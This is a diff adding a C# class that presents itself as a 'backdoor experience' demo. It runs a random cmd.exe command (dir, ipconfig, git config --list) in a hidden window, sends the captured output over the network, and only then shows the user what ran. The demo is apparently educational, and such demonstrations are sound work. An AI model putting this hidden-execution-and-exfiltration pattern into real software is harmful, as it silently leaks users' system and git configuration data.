@@ -1,0 +1,59 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+public class Ayashii
+{
+    static string[] CommandList = new string[] {
+        "/c dir",
+        "/c ipconfig",
+        "/c git config --list",
+        "/c echo このファイルをスタートアップに登録したよ(してない)",
+        "/c echo これがバックドア体験プログラムだよ",
+    };
+
+    public void DoAction()
+    {
+        string command = "";
+
+        Random rand = new Random();
+        int next = rand.Next(CommandList.Length);
+        command = CommandList[next];
+
+        // プロセスの起動情報を設定
+        var processStartInfo = new ProcessStartInfo
+        {
+            FileName = "cmd.exe",
+            Arguments = command,
+            RedirectStandardOutput = true, // 標準出力をリダイレクトする
+            UseShellExecute = false,     // シェルを介さずにプロセスを起動する
+            CreateNoWindow = true,       // ウィンドウを表示しない
+        };
+
+        string responseString = "";
+
+        // プロセスを開始し、出力を取得して終了を待つ
+        using (var process = new Process())
+        {
+            process.StartInfo = processStartInfo;
+            process.Start();
+
+            // 標準出力のストリームを最後まで読み込む
+            responseString = process.StandardOutput.ReadToEnd();
+            responseString = responseString.Replace("\n", "<br>");
+
+            // プロセスが終了するのを待つ
+            process.WaitForExit();
+        }
+
+        EventData evt = new EventData(0);
+        evt.DataPack("Data", responseString);
+        NetworkFront.Send(evt);
+
+        //ユーザにお知らせ
+        Process.Start("cmd.exe", command + " & pause");
+    }
+}
